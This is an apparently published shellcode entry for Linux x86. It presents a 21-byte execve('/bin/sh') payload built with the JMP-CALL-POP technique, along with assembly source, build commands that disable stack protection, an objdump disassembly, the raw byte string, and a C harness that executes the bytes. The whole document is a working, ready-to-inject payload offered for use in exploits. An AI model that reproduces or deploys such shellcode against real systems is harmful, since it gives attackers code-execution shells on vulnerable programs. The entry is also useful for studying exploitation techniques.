/*
;Category: Shellcode
;Title: GNU/Linux x86 - execve /bin/sh using JMP-CALL-POP technique (21
bytes)
;Author: Kirill Nikolaev
;Date: 01/07/2019
;Architecture: Linux x86

===========
Asm Source
===========

global _start

section .text
_start:
        jmp short call_shellcode
shellcode:
        pop ebx
        xor eax,eax
        mov al, 11
        int 0x80

call_shellcode:

        call shellcode
        message db "/bin/sh"
================================
Instruction for nasm compliation
================================

nasm -f elf32 shellcode.asm -o shellcode.o
ld -z execstack shellcode.o -o shellcode

===================
objdump disassembly
===================

Disassembly of section .text:


08048080 <_start>:
 8048080:       eb 07                   jmp    8048089 <call_shellcode>

08048082 <shellcode>:
 8048082:       5b                      pop    %ebx
 8048083:       31 c0                   xor    %eax,%eax
 8048085:       b0 0b                   mov    $0xb,%al
 8048087:       cd 80                   int    $0x80

08048089 <call_shellcode>:
 8048089:       e8 f4 ff ff ff          call   8048082 <shellcode>

0804808e <message>:
 804808e:       2f                      das
 804808f:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8048092:       2f                      das
 8048093:       73 68                   jae    80480fd <message+0x6f>

==================
21 Bytes Shellcode
==================

\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\xe8\xf4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

======================
C Compilation And Test
======================

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

/*
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\xe8\xf4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();

}